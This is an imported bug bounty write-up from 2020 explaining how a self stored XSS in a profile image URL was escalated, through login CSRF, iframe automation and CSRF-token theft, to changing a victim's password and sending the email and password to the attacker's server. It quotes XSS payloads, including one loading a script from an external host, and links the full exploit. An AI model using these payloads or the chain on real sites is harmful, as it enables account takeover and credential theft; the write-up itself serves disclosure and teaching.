---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-07-12_self-stored-xss-to-full-account-takeover.md
original_filename: 2020-07-12_self-stored-xss-to-full-account-takeover.md
title: Self stored xss to full account takeover
category: documents
detected_topics:
- xss
- access-control
- command-injection
- file-upload
- otp
- automation-abuse
tags:
- imported
- documents
- xss
- access-control
- command-injection
- file-upload
- otp
- automation-abuse
language: en
raw_sha256: 3304aa0aa0788ce47c388b537f6085eefa4568954623022f5b2080486f2faaeb
text_sha256: 1c2ad14c82841d00d3cf8fc7cd44db6e13ffe0e93182b9b15f1413e4a7051456
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# Self stored xss to full account takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-07-12_self-stored-xss-to-full-account-takeover.md
- Source Type: markdown
- Detected Topics: xss, access-control, command-injection, file-upload, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `3304aa0aa0788ce47c388b537f6085eefa4568954623022f5b2080486f2faaeb`
- Text SHA256: `1c2ad14c82841d00d3cf8fc7cd44db6e13ffe0e93182b9b15f1413e4a7051456`


## Content

---
title: "Self stored xss to full account takeover"
url: "https://medium.com/@nandwanajatin25/self-stored-xss-to-full-account-takeover-fe8e71471795"
authors: ["Jatin Aesthetic (@techyfreakk)"]
bugs: ["XSS", "Account takeover"]
publication_date: "2020-07-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4413
scraped_via: "browseros"
---

# Self stored xss to full account takeover

Self stored xss to full account takeover
Jatin Nandwana
Follow
5 min read
·
Jul 12, 2020

229

Hey,

Today I will share you my recent finding which was a self xss but I turned it into a full account takeover using various other misconfigurations and features already available on the website.

EXPLOITATION SCENARIO :

Self stored xss
Google login csrf to good xss
Logout of attacker account
Using previous google login to get into victim account
Stealing password change csrf token
Changing the password
Sending email+password to the server

So this was a private program so every thing will be redacted. During my testing I found a simple stored xss which was in the profile upload functionality. The functionality was like this, whenever I uploaded an image from my local drive, first the website uploads it to an other server, and in the next request it stores the url of that image stored on other server to the current website. I placed a simple “><script>alert(1)</script> in that url something like this &imageurl=https://example.com“><script>alert(1)</script> and the alert box popped up each time I visited my profile. But this was only a self xss. I needed to make it execute at the victim side.

I knew that there was a google login method in the site and I can login into my account using this html code and make him visit my profile page after 5 seconds where xss was stored using the setTimeout function in javascript. Here the TOKEN is the google login token which can be captured after logging in to the account and it stays active for 1 day so we can send it to a victim and it can be automated to update it regularly.

So after this I shown a scenario in the report where an attacker can make a user visit the website and with the help of xss do some social engineering to steal his data as the url in the browser was of the same website, it makes attack more believable. The exploit was appreciated by the h1 triager, but he wanted me to execute xss on the victim account for a good impact. And I will say the triager somehow motivated me through his words and I thank him for that 💙

So the next task for me was to somehow login to the victim account and execute the xss. A quick recap :

Self xss on profile page
Csrf to login in attacker account using google login token to good xss

Now my curiosity said that what if the victim is already using his google account on the site , cant we use that account to pop xss on victim? Yeah definitely and then I did some research about this topic and I knew this writeup which I read before https://www.geekboy.ninja/blog/airbnb-bug-bounty-turning-self-xss-into-good-xss-2/ from @emgeekboy and this helped me to move forward a lot.

Get Jatin Nandwana’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

As mentioned in the writeup we first need to logout the user from his account. In my case it was not a simple logout url , logout only happened with a csrf token placed in the parameter csrf. But the token itself is placed in the source code so we can easily steal it with the xss. So I wrote this javascript to logout from attacker account using an iframe. This was hosted on my server and I updated the xss payload like this “><script src=”https://myserver.com/exploit.js”></script> in the original xss

In this way I logged out from my account(Attacker),now I needed to login to the victim account using the google login button ,but the problem I was facing was that there was no url for logging in to the google, and only way to do so was by clicking on that google login button. So now I started reading about javascript for clicking a button inside the dom and soon was able to do with this script. Its a little complicated, what I have done here is open an another iframe inside the previous iframe, when that second iframe loads properly, use its dom to click the google login button after 30 seconds so that the frame loads properly.

Now I was in the victim account, but if I had reached this much why not use other misconfugurations to escalate to a full account takeover. Cookies were httponly so no chance to steal them. In the settings we can add a password to a google account as well, and the funny thing was it does not require any previous password. So now my end goal was to construct a exploit to change the password and javascript helped me to do so ❤️

Now I needed to get some more things for the next steps and those were :

There was a different csrf token for password change as well and it was only on the settings page source code. I needed it in order to perform password change.
Settings page for an user was like this https://example.com/user/setting so I needed the username as well to go to that page and steal csrf token

If you remember the above code where I stole csrf token from source code, the same place had the username as well so I can get the username in the same manner. Next I need to visit this link where the csrf token for password change is there https://example.com/<USER_NAME_OBTAINED>/setting. Now for this I opened yet another iframe inside the previous iframe and stole the csrf token, the javascript code for the same is like this,

So now I got the password change csrf token, I just need to make a xmlhttp POST request to change the victims password, and the javascript code for it

But as an attackers point of view you must be thinking, ok I changed the password for an user but how to get access to his email. I need both the credentials for an successful account takeover. Thankfully the email was stored in the local storage of the same site. So I used that to send the final credentials to my server using the javascript fetch api.

In this way I was able to completely takeover an account using a simple self stored xss.

You can read the full exploit code here https://gist.github.com/yourbuddy25/75080f317a464ca8a46acd8e5b5f8be6. The full exploit takes atleast 1 minute to fully takeover an account due to timeouts set on the iframes to load them properly.

MAIN TAKEAWAYS :

Always try to escalate a xss, like stealing some personal information through local session storage, account takeovers,privilege escalation or a normal phishing scenario.
Javascript is very powerful, it can even create clicks so always look for opportunities where you use those clicks for you advantage like google login, account delete button with clickjacking protection, etc.
Sometimes main part of exploitation is creating the exploit manually using different languages, so always be keen to learn and understand about new languages. I was a beginner in javascript, but some googling helped me to make the exploit. At first I was feared how would I tackle so many steps, but I was determined and made the exploit in around 6–7 hours with some breaks.

I am also activley looking for any penetration testing, or any other appsec engineer position. If any recruiter reading this, they can contact me below.

TWITTER : https://twitter.com/techyfreakk

LINKEDIN : https://www.linkedin.com/in/jatin-nandwana-38121654/

Thanks for reading :)
